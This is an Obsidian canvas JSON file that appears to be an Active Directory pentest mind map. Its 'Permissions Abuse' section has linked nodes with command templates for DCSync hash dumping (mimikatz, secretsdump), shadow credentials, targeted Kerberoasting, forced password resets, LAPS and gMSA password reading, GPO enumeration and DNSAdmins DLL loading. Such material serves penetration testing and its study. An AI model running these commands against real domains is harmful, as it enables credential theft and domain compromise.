{
	"nodes":[
		{"id":"d19089319357e5bd","type":"group","x":-760,"y":-380,"width":3800,"height":6860,"color":"#324bff","label":"PERMISSIONS¬†ABUSE"},
		{"id":"885ce9b63d16fcd2","type":"group","x":3520,"y":1710,"width":1080,"height":766,"color":"2","label":"CRACKING HASH"},
		{"id":"b656ea1bcfcc7c32","type":"group","x":3520,"y":3710,"width":1080,"height":763,"color":"1","label":"GOT DOMAIN ADMIN ACCESS"},
		{"id":"174374cfcab87ac9","type":"group","x":3520,"y":5550,"width":1080,"height":763,"color":"#32a5ff","label":"KERBEROS DELEGATION ABUSE"},
		{"id":"495a125e4d837480","type":"group","x":3520,"y":2670,"width":1080,"height":760,"color":"#e178e1","label":"GOT LOCAL ADMIN ACCESS"},
		{"id":"3bcace836f7cf266","type":"group","x":3520,"y":750,"width":1080,"height":760,"color":"#324bff","label":"DACL ABUSE"},
		{"id":"97feccd7809c5986","type":"group","x":3520,"y":4670,"width":1080,"height":760,"color":"4","label":"GOT CREDENTIALS"},
		{"id":"246dcab9d218cdde","type":"group","x":3520,"y":-170,"width":1080,"height":760,"color":"6","label":"LATERAL MOVE"},
		{"id":"dcc79158d89bc1bd","type":"group","x":-1960,"y":2670,"width":1080,"height":760,"label":"NO CREDENTIALS"},
		{"id":"e1cc6f42e36d66a8","type":"text","text":"# Dcsync \n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync#theory\n\n>[!example] Tools\n>- [secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)\n>- [mimikats](https://github.com/gentilkiwi/mimikatz)\n\n\n```shell\n# Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts\nüîµ mimikatz lsadump::dcsync /domain:<target_domain> /user:<target_domain>\\administrator\nüü£ secretsdump.py '<domain>'/'<user>':'<password>'@'<domain_controller>'\n```","x":320,"y":-253,"width":1840,"height":540},
		{"id":"10aecfb184b8f7d0","type":"text","text":"# Can change msDS-KeyCredentialLInk (Generic Write) + ADCS\n## Shadow Credentials\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials#shadow-credentials\n\n>[!example] Tools\n>- [certipy](https://github.com/ly4k/Certipy)\n>- [pywhisker](https://github.com/ShutdownRepo/pywhisker)\n\n\n```shell\n# Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts\n‚ö™ certipy shadow auto '-u <user>@<domain>' -p <password> -account '<target_account>'\n‚ö™ pywhisker.py -d \"FQDN_DOMAIN\" -u \"user1\" -p \"CERTIFICATE_PASSWORD\" --target \"TARGET_SAMNAME\" --action \"list\"\n```","x":320,"y":407,"width":1840,"height":520},
		{"id":"28b8b480c498c397","type":"text","text":"# üõ†Ô∏è  Permission On Group\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/dacl/#dacl-abuse\n\n## GenericAll/GenericWrite/Self/Add Extended Rights\n\n### Add member to the group\n\n---\n## Write Owner\n\n### Grant Ownership\n\n---\n## WriteDACL + WriteOwner\n\n### Grant rights \n#### Give yourself generic all","x":320,"y":1007,"width":1840,"height":640},
		{"id":"9d04e362df2e3c5d","type":"text","text":"# üõ†Ô∏è  Permission On OU\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/dacl/#dacl-abuse\n\n>[!example] Tools\n> [targetedkerberoast](https://github.com/ShutdownRepo/targetedKerberoast)\n> [Ouned](https://github.com/synacktiv/OUned)\n\n## Write Dacl\n### ACE Inheritance \n#### Grant rights\n---\n\n## GenericAll / GenericWrite / Manage Group Policy Links\n\n```shell\n‚ö™ OUned.py --config config.ini\n```","x":320,"y":3287,"width":1840,"height":640},
		{"id":"ae4bfb5faf048473","type":"text","text":"#  Get LAPS passwords\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/dacl/readlapspassword#readlapspassword\n\n>[!example] Tools\n> [ldeep](https://github.com/franc-pentest/ldeep)\n> [netexec](https://github.com/Pennyw0rth/NetExec)\n\n```shell\n# who can read laps?\nüî¥ MATCH p=(g:Base)-[:ReadLAPSPassword]->(c:Computer) RETURN p\n# Read laps with ldeep\n‚ö™ ldeep ldap -u '<user>' -p '<password>' -d '<domain>' -s ldaps://'<dc_ip>' laps\n# Read laps with netexec\nüï∑Ô∏è nxc ldap '<ip>' -u '<user>' -p '<pass>' -M laps\nüîµ Get-LapsADPassword -DomainController <ip_dc> -Credential <domain>\\<login> | Format-Table -AutoSize\n```","x":320,"y":4507,"width":1840,"height":640},
		{"id":"bb33a371fd70ad59","type":"text","text":"#  GPO\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/group-policies#theory\n\n>[!example] Tools\n> [ldeep](https://github.com/franc-pentest/ldeep)\n> [netexec](https://github.com/Pennyw0rth/NetExec)\n\n```shell\n# Who can control GPOs\nüî¥ MATCH p=((n:Base)-[]->(gp:GPO)) RETURN p\n# SID of principals that can create new GPOs in the domain\nüîµ Get-DomainObjectAcl -SearchBase \"CN=Policies,CN=System,DC=blah,DC=com\" -ResolveGUIDs  | ? { $_.ObjectAceType -eq \"Group-Policy-Container\" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl\n# Return the principals that can write to the GP-Link attribute on OUs\nüîµ Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq \"GP-Link\" -and $_.ActiveDirectoryRights -match \"WriteProperty\" } | select ObjectDN, SecurityIdentifier | fl\n\n```","x":320,"y":5207,"width":1840,"height":560},
		{"id":"e10b645c930c0c25","type":"text","text":"#  DNS Admin\n## üí• DNSadmins abuse (CVE-2021-40469)  \n>[!info] Theory\n>- https://www.tenable.com/indicators/ioa/I-DnsAdmins\n>- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise\n\n>[!example] üõ†Ô∏è Tools\n> - [dnsadmins](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd)\n> - [sc](https://learn.microsoft.com/en-us/windows/win32/services/controlling-a-service-using-sc) \n\n```shell\n‚ö´ dnscmd.exe /config /serverlevelplugindll <\\\\path\\to\\dll> # need a dnsadmin use\n‚ö´ sc \\\\DNSServer stop dns sc \\\\DNSServer start dns\n```","x":320,"y":5807,"width":1840,"height":520},
		{"id":"2b1dd1aeb8d5e977","type":"text","text":"# üõ†Ô∏è  Permission On Computer\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/dacl/#dacl-abuse\n\n## GenericAll / GenericWrite\n### msDs-AllowedToActOnBehalf \n\n---\n## GenericAll / GenericWrite\n\n### add Key Credentials \n","x":320,"y":1707,"width":1840,"height":480},
		{"id":"3e282c81f28fa413","type":"text","text":"# üõ†Ô∏è  Permission On User\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/dacl/#dacl-abuse\n\n>[!example] Tools\n> [targetedkerberoast](https://github.com/ShutdownRepo/targetedKerberoast)\n## GenericAll / GenericWrite\n### Change password \n```shell\n‚ö´ net user <user> <password> /domain\n```\n\n### add SPN (target kerberoasting)\n```shell\n‚ö™ targetedKerberoast.py -d '<domain>' -u '<user>' -p '<pass>'\n```\n\n### add key credentials \n\n### login script\n---\n\n## ForceChangePassword\n\n```shell\n‚ö´ net user '<user>' '<password>' /domain\n```","x":320,"y":2307,"width":1840,"height":940},
		{"id":"00c1b430616f1404","type":"text","text":"#  ReadGMSAPassword\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword#readgmsapassword\n\n>[!example] Tools\n> [[gMSADumper](https://github.com/micahvandeusen/gMSADumper)](https://github.com/micahvandeusen/gMSADumper)\n> [ldeep](https://github.com/franc-pentest/ldeep)\n> [netexec](https://github.com/Pennyw0rth/NetExec)\n\n```shell\n‚ö™ gMSADumper.py -u '<user>' -p '<password>' -d '<domain>'\n‚ö™ ldeep ldap -u '<user>' -p '<password>' -d '<domain>' -s ldaps://'<dc_ip>' gmsa\nüï∑Ô∏è nxc ldap '<ip>' -u '<user>' -p '<pass>' --gmsa\n```","x":320,"y":3967,"width":1840,"height":500},
		{"id":"7fddaf3e2dcbf7f6","type":"text","text":"# PERMISSIONS ABUSE","x":-640,"y":3050,"width":408,"height":51},
		{"id":"6e27b29728d65186","type":"text","text":"# LATERAL MOVE","x":2320,"y":642,"width":520,"height":50,"color":"6"},
		{"id":"da3b760ca3af0cb7","type":"text","text":"# CRACKING HASH","x":2320,"y":2647,"width":520,"height":50,"color":"2"},
		{"id":"aca1915dd9c79ff4","type":"text","text":"# PERMISSIONS ABUSE","x":2320,"y":2752,"width":520,"height":50,"color":"#324bff"},
		{"id":"0cd2b3c329a6206e","type":"text","text":"# GOT CREDENTIALS","x":2320,"y":2847,"width":520,"height":50,"color":"4"},
		{"id":"7036cc5714e5ad7c","type":"text","text":"# GOT DOMAIN ADMIN ACCESS","x":2320,"y":-113,"width":520,"height":50,"color":"1"},
		{"id":"12767adbd497e682","type":"text","text":"# CRACKING HASH","x":2320,"y":87,"width":520,"height":50,"color":"2"},
		{"id":"574ae2a5fd3c0665","type":"text","text":"# LATERAL MOVE","x":2320,"y":-8,"width":520,"height":50,"color":"6"},
		{"id":"17a40610edb20cb8","type":"text","text":"# KERBEROS DELEGATION ABUSE","x":2320,"y":1880,"width":520,"height":50,"color":"#32a5ff"},
		{"id":"4acaf16903192626","type":"text","text":"# PERMISSIONS ABUSE","x":2320,"y":1973,"width":520,"height":50,"color":"#324bff"},
		{"id":"fb20d46e9ad74845","type":"text","text":"# GOT LOCAL ADMIN ACCES","x":2360,"y":4802,"width":520,"height":50,"color":"#e178e1"},
		{"id":"7459304d65109b76","type":"text","text":"# GOT LOCAL ADMIN ACCES","x":2320,"y":6042,"width":520,"height":50,"color":"#e178e1"},
		{"id":"ea8927dd222744cb","type":"file","file":"ATTACKS/GOT LOCAL ADMIN ACCESS.canvas","x":3600,"y":2750,"width":920,"height":600,"color":"#e178e1"},
		{"id":"7779b7d74d2d60ff","type":"file","file":"ATTACKS/GOT DOMAIN ADMIN ACCESS.canvas","x":3600,"y":3790,"width":920,"height":600,"color":"1"},
		{"id":"d10384109a4d9fb4","type":"file","file":"ATTACKS/GOT CREDENTIALS.canvas","x":3600,"y":4750,"width":920,"height":600,"color":"4"},
		{"id":"7155c72c8ed6b677","type":"file","file":"ATTACKS/KERBEROS DELEGATION ABUSE.canvas","x":3600,"y":5633,"width":920,"height":600,"color":"#32a5ff"},
		{"id":"285bd8a1e7175746","type":"file","file":"ATTACKS/LATERAL MOVE.canvas","x":3600,"y":-88,"width":920,"height":600,"color":"6"},
		{"id":"b86d0359d617e221","type":"file","file":"ATTACKS/PERMISSIONS ABUSE.canvas","x":3600,"y":830,"width":920,"height":600,"color":"#324bff"},
		{"id":"92b38f05b46b8ad6","type":"file","file":"ATTACKS/CRACKING HASH.canvas","x":3600,"y":1786,"width":920,"height":600,"color":"2"},
		{"id":"512b167c3a70a76f","type":"file","file":"INTERACTIVE-MAP.canvas","x":-1880,"y":2750,"width":920,"height":600}
	],
	"edges":[
		{"id":"bb57c4341dfdfc51","fromNode":"e1cc6f42e36d66a8","fromSide":"right","toNode":"7036cc5714e5ad7c","toSide":"left"},
		{"id":"4cffc40ae21ddce6","fromNode":"e1cc6f42e36d66a8","fromSide":"right","toNode":"574ae2a5fd3c0665","toSide":"left"},
		{"id":"cb9baabef0840381","fromNode":"e1cc6f42e36d66a8","fromSide":"right","toNode":"12767adbd497e682","toSide":"left"},
		{"id":"c44a4628c27ceb82","fromNode":"2b1dd1aeb8d5e977","fromSide":"right","toNode":"17a40610edb20cb8","toSide":"left"},
		{"id":"83209cfb1241928c","fromNode":"2b1dd1aeb8d5e977","fromSide":"right","toNode":"4acaf16903192626","toSide":"left"},
		{"id":"3cac130f7529799a","fromNode":"3e282c81f28fa413","fromSide":"right","toNode":"da3b760ca3af0cb7","toSide":"left"},
		{"id":"b81e3c8cd9ed8dce","fromNode":"3e282c81f28fa413","fromSide":"right","toNode":"aca1915dd9c79ff4","toSide":"left"},
		{"id":"a850b8665e5eae9a","fromNode":"3e282c81f28fa413","fromSide":"right","toNode":"0cd2b3c329a6206e","toSide":"left"},
		{"id":"ec3d1f5fa55486d0","fromNode":"e10b645c930c0c25","fromSide":"right","toNode":"7459304d65109b76","toSide":"left"},
		{"id":"34680ada51a5ed78","fromNode":"ae4bfb5faf048473","fromSide":"right","toNode":"fb20d46e9ad74845","toSide":"left"},
		{"id":"7000087106c9f767","fromNode":"10aecfb184b8f7d0","fromSide":"right","toNode":"6e27b29728d65186","toSide":"left"},
		{"id":"08d8d01a5a4dd11c","fromNode":"d19089319357e5bd","fromSide":"right","toNode":"285bd8a1e7175746","toSide":"left","color":"6"},
		{"id":"d466795b589775c1","fromNode":"d19089319357e5bd","fromSide":"right","toNode":"b86d0359d617e221","toSide":"left","color":"#324bff"},
		{"id":"26e92253861badd9","fromNode":"d19089319357e5bd","fromSide":"right","toNode":"92b38f05b46b8ad6","toSide":"left","color":"2"},
		{"id":"6456b8d74df15a71","fromNode":"d19089319357e5bd","fromSide":"right","toNode":"ea8927dd222744cb","toSide":"left","color":"#ff78e1"},
		{"id":"9937177cb3572937","fromNode":"d19089319357e5bd","fromSide":"right","toNode":"7779b7d74d2d60ff","toSide":"left","color":"1"},
		{"id":"496ca3d79e1cf2ed","fromNode":"d19089319357e5bd","fromSide":"right","toNode":"d10384109a4d9fb4","toSide":"left","color":"4"},
		{"id":"d0e62bd5bf45c089","fromNode":"d19089319357e5bd","fromSide":"right","toNode":"7155c72c8ed6b677","toSide":"left","color":"#32a5ff"},
		{"id":"0908f13634a4d3e2","fromNode":"512b167c3a70a76f","fromSide":"right","toNode":"d19089319357e5bd","toSide":"left"},
		{"id":"e2968f6f2160790c","fromNode":"7fddaf3e2dcbf7f6","fromSide":"right","toNode":"e1cc6f42e36d66a8","toSide":"left"},
		{"id":"e0d55b15cae3ee66","fromNode":"7fddaf3e2dcbf7f6","fromSide":"right","toNode":"10aecfb184b8f7d0","toSide":"left"},
		{"id":"afce4300f2ea7680","fromNode":"7fddaf3e2dcbf7f6","fromSide":"right","toNode":"28b8b480c498c397","toSide":"left"},
		{"id":"8fa68bfbe6f593e1","fromNode":"7fddaf3e2dcbf7f6","fromSide":"right","toNode":"2b1dd1aeb8d5e977","toSide":"left"},
		{"id":"4e05ddd5b8342d9e","fromNode":"7fddaf3e2dcbf7f6","fromSide":"right","toNode":"3e282c81f28fa413","toSide":"left"},
		{"id":"2fa7cfe2ca00ea17","fromNode":"7fddaf3e2dcbf7f6","fromSide":"right","toNode":"9d04e362df2e3c5d","toSide":"left"},
		{"id":"f4d60f499f983bcb","fromNode":"7fddaf3e2dcbf7f6","fromSide":"right","toNode":"00c1b430616f1404","toSide":"left"},
		{"id":"cbe336925c913595","fromNode":"7fddaf3e2dcbf7f6","fromSide":"right","toNode":"ae4bfb5faf048473","toSide":"left"},
		{"id":"c812234b0a015f67","fromNode":"7fddaf3e2dcbf7f6","fromSide":"right","toNode":"bb33a371fd70ad59","toSide":"left"},
		{"id":"9eef3caf238fb95e","fromNode":"7fddaf3e2dcbf7f6","fromSide":"right","toNode":"e10b645c930c0c25","toSide":"left"}
	]
}